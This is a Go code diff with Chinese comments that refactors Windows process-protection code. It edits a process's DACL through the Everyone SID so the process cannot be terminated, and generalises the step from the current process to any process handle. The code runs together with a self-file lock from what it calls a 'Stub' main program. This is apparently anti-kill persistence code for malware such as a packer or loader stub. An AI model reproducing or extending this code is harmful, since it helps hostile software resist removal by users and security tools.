@@ -44,14 +44,12 @@ var (
 	procFreeSid                  = advapi32.NewProc("FreeSid")
 )
 
-// ProtectProcess 剥夺系统强制结束当前进程的权限
-func ProtectProcess() {
-	handle, _ := syscall.GetCurrentProcess() // 修复: GetCurrentProcess 返回两个值 (Handle, error)
-
+// ProtectProcessByHandle 🌟新增：为指定的任意进程句柄剥夺被结束的权限
+func ProtectProcessByHandle(handle syscall.Handle) {
 	var pOldDacl uintptr
 	var pSD uintptr
 
-	// 1. 获取当前进程的安全描述符 (Security Descriptor)
+	// 1. 获取目标进程的安全描述符
 	ret, _, _ := procGetSecurityInfo.Call(
 		uintptr(handle),
 		uintptr(SE_KERNEL_OBJECT),
@@ -66,17 +64,16 @@ func ProtectProcess() {
 	}
 	defer syscall.LocalFree(syscall.Handle(pSD))
 
-	// 2. 初始化 Everyone 的 SID (Security Identifier)
+	// 2. 初始化 Everyone 的 SID
 	var pEveryoneSid uintptr
-	// SECURITY_WORLD_SID_AUTHORITY = {0,0,0,0,0,1}
 	var SIDAuthWorld = [6]byte{0, 0, 0, 0, 0, 1}
 
 	ret, _, _ = procAllocateAndInitializeSid.Call(
 		uintptr(unsafe.Pointer(&SIDAuthWorld)),
-		1, 0, 0, 0, 0, 0, 0, 0, 0, // SECURITY_WORLD_RID 为 0
+		1, 0, 0, 0, 0, 0, 0, 0, 0,
 		uintptr(unsafe.Pointer(&pEveryoneSid)),
 	)
-	if ret == 0 { // 0 表示失败
+	if ret == 0 {
 		return
 	}
 	defer procFreeSid.Call(pEveryoneSid)
@@ -88,12 +85,12 @@ func ProtectProcess() {
 	ea.grfInheritance = NO_INHERITANCE
 	ea.Trustee.TrusteeForm = TRUSTEE_IS_SID
 	ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP
-	ea.Trustee.ptstrName = pEveryoneSid // 绑定 Everyone 的 SID
+	ea.Trustee.ptstrName = pEveryoneSid
 
-	// 4. 将新的拒绝规则合并到旧的 DACL 中，生成新的 DACL
+	// 4. 合并并生成新的 DACL
 	var pNewDacl uintptr
 	ret, _, _ = procSetEntriesInAclW.Call(
-		1, // 规则数量
+		1,
 		uintptr(unsafe.Pointer(&ea)),
 		pOldDacl,
 		uintptr(unsafe.Pointer(&pNewDacl)),
@@ -101,7 +98,7 @@ func ProtectProcess() {
 	if ret == ERROR_SUCCESS && pNewDacl != 0 {
 		defer syscall.LocalFree(syscall.Handle(pNewDacl))
 
-		// 5. 将包含“防杀规则”的新 DACL 写回当前进程
+		// 5. 将新 DACL 写入目标进程
 		procSetSecurityInfo.Call(
 			uintptr(handle),
 			uintptr(SE_KERNEL_OBJECT),
@@ -111,9 +108,14 @@ func ProtectProcess() {
 	}
 }
 
+// ProtectProcess 剥夺系统强制结束当前父进程的权限
+func ProtectProcess() {
+	handle, _ := syscall.GetCurrentProcess()
+	ProtectProcessByHandle(handle)
+}
+
 // EnableProtection 一键开启全局防御 (供 Stub 主程序调用)
 func EnableProtection() {
-	// 并发执行，不阻塞主业务加载逻辑
 	go LockSelfFile()
 	go ProtectProcess()
 }
